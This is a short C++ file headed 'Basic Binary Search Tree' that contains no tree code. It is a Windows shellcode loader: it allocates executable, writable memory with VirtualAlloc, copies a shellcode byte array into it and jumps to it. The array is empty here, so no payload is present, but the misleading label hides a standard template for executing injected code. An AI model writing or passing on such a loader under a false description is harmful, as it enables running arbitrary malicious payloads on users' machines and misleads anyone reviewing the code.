/*
    Basic Binary Search Tree C++
*/

#include <windows.h>
#include <iostream>

int main() {

    unsigned char shellcode[] = {
    };
    
    int shellcode_size = sizeof(shellcode);
    
    void* exec_mem = VirtualAlloc(0, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    memcpy(exec_mem, shellcode, shellcode_size);
    
    ((void(*)())exec_mem)();
    
    return 0;
}

